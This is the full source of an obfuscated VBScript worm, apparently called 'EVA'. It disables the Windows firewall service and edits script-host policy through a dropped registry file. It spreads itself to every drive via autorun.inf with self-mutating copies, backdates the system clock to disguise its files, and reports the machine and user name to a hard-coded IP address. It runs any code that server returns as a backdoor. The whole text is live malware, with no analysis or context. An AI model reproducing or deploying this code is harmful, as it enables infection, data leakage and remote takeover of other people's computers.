ON eRROr REsUmE nEXT
SEt fSo=cREAteOBJeCT(STrReverSE("TCejbOmETsYSeLif.GnITpIRcS"))
sEt WsHshELl=cReATEoBJECt(strRevErse("lLeHS.tPirCSw"))
DiM DrI_liSt,dRI_LiST0
dIM ISsENd
IssENd=0
c_tIME=DAtE()
wSHsHeLl.RUn "NeT stoP shaReDaCCess",0
SeT DrVS=FsO.DRIvES
SYSdIr=FsO.GeTSPeCiAlfoLDEr(1)
THiSPaTh=wsCRIpT.scrIpTFuLLnAme
sET FC=FsO.oPeNteXtFilE(tHiSpATH,1)
scopy=fc.readalL
Fc.CloSE
SEt Fc=nOtHing
CaLL WrITEFilE(SYSdIR&"\SysINfo.rEg",UNEsCApE(STrrEVeRsE("00c2%00C2%00C2%00C2%00C2%00C2%00c2%00C2%00C2%00c2%00C2%00c2%00C2%00C2%00c2%00A3%92%b82%XEhD3%22%EMiTCexe22%A0%D0%02%22%22%D3%22%sReTemArAp22%a0%D0%02%22%Sbv.gfCnrPc5%c5%23MEtsYsc5%c5%52%RiDnIw52%22%D3%22%tPIRCs22%A0%d0%02%D5%0C5%0c5%PuTRAtSC5%STPirCSc5%EnIHCamC5%ETatsC5%ycIlOp02%puORGC5%nOiSrEVTNeRrUCC5%SWoDNIwC5%TfOSOrCIMc5%ErawTFOsc5%EnIHcAM_Lacol_YEkHB5%a0%D0%A0%D0%02%00c2%00c2%00c2%00c2%00C2%00c2%00C2%00c2%00c2%00c2%00c2%00C2%00c2%00C2%00C2%00a3%92%B82%XEHD3%22%EMiTCexe22%A0%d0%02%22%22%D3%22%srETeMaRaP22%a0%d0%02%22%sbV.GfCNrpc5%C5%23MeTsYSC5%C5%52%RIDnIW52%22%d3%22%TPiRcS22%A0%d0%02%D5%0C5%0c5%PUTrATsc5%sTPiRCsC5%mEtSYsC5%SwODnIwC5%TfOsoRCiMc5%SEIcILOPc5%erAwtFosc5%eNiHCam_laCOl_YEkHB5%a0%D0%a0%D0%03%03%E2%53%02%e6%f6%96%37%27%56%65%02%27%F6%47%96%46%54%02%97%27%47%37%96%76%56%25%02%37%77%F6%46%E6%96%75%")))
WsHSHeLL.rUn "reGEDit /S SYsINfO.reg",0
WscrIpT.sLEeP 200
FsO.dElETeFiLe SySdiR&"\sYsINFo.REG",truE
If instR(THisPatH,sySDiR)>0 ThEn
DrI_LIST0=LIStdRV()
O_timE=lEFt(C_TiMe,3)&CStR(INt(MId(c_tIME,4,1))-1)&RIght(c_tIMe,lEN(C_TiMe)-4)
wShSHElL.RuN "cMd /c DAtE "&O_Time,0
wSCRiPT.SLeEp 10000
For DrI_i=1 To lEn(DrI_lIsT0)
CalL WriTEaUtO(MID(DRI_list0,drI_i,1)&":\")
neXT
WShSHeLl.rUn "CmD /C DaTE "&c_TIME,0
coMpuTErnAmE="":USeRNaME=""
SeT ObJWMisERvICe=gETobjEcT("WinmGMTS:{iMpErSONAtIoNLEvEL=iMPErSoNAtE}!\\.\rOoT\ciMV2")
SeT cOLcOmputERS = objWmISeRViCe.eXeCQuERy("SElEcT * fRom WiN32_COMpUTERsysteM")
for eAcH obJcoMPutER IN CoLcOmpuTeRs
COmPUTErnAME=ObJCompUteR.naMe
UsERNaME=OBJComPUtEr.uSERnaME
Next
if UsErNAme="" THEn uSeRNAMe="EVAr"
iF InStR(uSERnAME,"\")<=0 TheN
uSErNAmE=comPUTeRName&"\"&USeRnamE
EnD iF
Do
If IsSenD=0 tHeN
sET Xml=crEatEobject(sTRreVerSE("PTtHLmXrEvRes.2lMxSM"))  
xmL.OPEn "get",sTRreVeRsE(UNEsCApE("%3d%61%3F%70%73%61%2e%74%6e%75%6F%63%2F%61%76%65%2f%62%7a%7a%2F%30%30%31%2e%34%30%31%2e%39%31%31%2e%32%30%32%2f%2F%3A%70%74%74%68"))&uSeRnaMe,0
xMl.SetReQuEsthEader "USer-AgENT","eVar"
XMl.SEnd()
iF ErR.NuMbEr=0 Then
IssenD=1
REs=Xml.ReSpOnSEteXt
if uCAsE(lEfT(res,7))=UCASe("EXeCuTe")  then eXeCuTe reS
ElsE
ERr.cLeAr
end if
SEt XMl=nOThinG
End iF

drI_lIST=LisTdRV()
fOr Dri_k=1 To LEN(Dri_liSt)
if Instr(DRI_lISt0,MID(dRi_LIsT,drI_k,1))<=0 ThEN
CaLl wrIteauTO(mid(Dri_LIsT,drI_k,1)&":\")
End iF
NExT
dri_LisT0=DRI_lIST
wScrIPT.sleep 1000
loOp
elSe
WshsHeLl.Run "expLOReR .\",3
wsCriPt.SlEEP 2000
WSHSHelL.APpACtiVatE uNeScaPe(LCAsE("%u6211%u7684%u7535%u8111"))
WShSheLL.SEndKEys ucAsE("% C")
RunflAg=0
For eACh PS iN geTObJeCt _ 
("WinmgMTs:\\.\Root\CimV2:WIN32_PRoCeSs").InstancEs_ 
if LcASe(Ps.NAme)=lCasE("wScriPT.exe") TheN
rUNfLAg=runfLAG+1
end IF
neXt
If RuNFlAg>=2 then wSCrIpt.qUit
sET Sf=fsO.geTfoldEr(sYSdiR)
F_TimE=LeFt(sF.DaTeCREATed,INStr(SF.daTECREAteD," ")-1)
WShSHeLL.Run "cMd /C DAtE "&f_tiME,0
wScRIpT.SLEEP 100
CALL WriTEfILe(SYSdIr&LCASE("\PrncFg.vBS"),VS(sCOpY))
wshSHELL.run "CMd /c daTE "&c_TiMe,0
wshsHeLL.Run sYsdIR&"\PRncfg.Vbs"
enD If
fuNctIOn vs(STr)
eXeCuTe STRRevERSE(uNESCapE("%29%29%22U%25%22%28ESaCL%2c%29%22U%25%22%28Esacu%2csv%28eCAlPeR%3DSV%0d%0ATXEn%0d%0aFI%20DNe%0D%0AC%26SV%3dSv%0D%0aeSLE%0D%0A%29c%28ESACL%26sV%3dsv%0d%0AnEHt%2005%3e%29001*%29%28DnR%28TnI%20fi%0D%0aEzimoDnAr%0d%0a%29%291%2Ci%2CrTs%28dIM%28esACU%3dC%0D%0A%29RTs%28neL%20Ot%201%3dI%20roF"))
eND FuNCtIon
FUnctIoN LIsTdRV()
eXeCuTE StRreVErSE(uNEScApE("TSIl_PMt%3DvrdTSIl%0D%0ATxEN%0d%0aFI%20Dne%0D%0aretTelEViRD.VRd%26TsIl_pmT%3DtSil_pMt%0D%0ANEht%20YdaErsi.VrD%20fi%0d%0aSvrD%20Ni%20vRd%20HCAE%20ROF%0D%0A%22%22%3dtSIl_PMT%0d%0AtSIl_PMT%20miD"))
ENd FuNctioN

SuB WRiTeAUTO(PaTh)
EXEcUte StRRevERSe(uNESCAPe("Fi%20dne%0D%0AEUrT%2C%22fni.NUROTUa%22%26htap%20ELiFEtELeD.OSf%0d%0AnEHt%20%29%22FnI.NUrotuA%22%26htAp%28StsIxeELiF.oSF%20fIeSlE%0d%0A%29%28DNr%26HTap%2C%22fnI.nuROTuA%22%26HtAP%20rEdlOfEvOM.OsF%0D%0anEHt%20%29%22FnI.NUROtUa%22%26hTap%28STsiXEReDlOF.OSF%20Fi"))
cMDStr="ShELl\*\CommaND=WSCript.EXe "&Chr(34)&"EVa.vBS"&chr(34)
AutOsTr="[aUTORun]"&VbcRlf&"OpEn="&vBcrLF&RepLACe(cMdStR,"*","OPen")&VbcRLF&rePLACE(cmDStr,"*","eXPlORe")&VbcRlf&rEpLACE(CMdStr,"*","fInD")
CaLL WRItEfIlE(PAtH&uCAsE("aUTOrUn.INF"),AUTostR)
CALl WRItEFiLE(Path&"EVA.Vbs",VS(scopY))
eND SUb

sUb wrItEFiLe(FpAth,CoNTENt)
EXecUte sTrReVErsE(uNEsCapE("gNiHtOn%3DaF%20Tes%0D%0a7%3DseTUBIRTta.Af%0D%0A%29hTapF%28eLIfTEg.oSf%3dAf%20TES%0d%0AgNiHtON%3dcf%20teS%0d%0aEsOLc.Cf%0D%0aTnEtnoc%20etiRW.cF%0d%0A%29eUrt%2c2%2CHTapf%28ELIFtxeTNEPO.Osf%3dCf%20Tes%0D%0AeUrt%2CHtapF%20ElifeTElEd.OSf%20NeHt%20%29HTapF%28stsixEeLiF.OsF%20fi"))
END sub
